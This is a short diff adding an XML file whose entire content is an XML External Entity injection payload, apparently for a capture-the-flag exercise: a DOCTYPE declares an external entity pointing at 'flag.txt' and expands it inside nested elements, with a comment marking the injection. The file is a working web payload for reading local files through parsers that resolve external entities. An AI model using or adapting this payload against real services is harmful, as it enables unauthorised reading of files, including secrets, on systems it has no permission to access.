@@ -1,0 +1,10 @@
+<?xml version='1.0' encoding='UTF-8'?>
+<!-- XML External Entity injection start -->
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "flag.txt" >
+]>
+
+<GKSK>
+	<GKSK>&xxe;</GKSK>
+</GKSK>
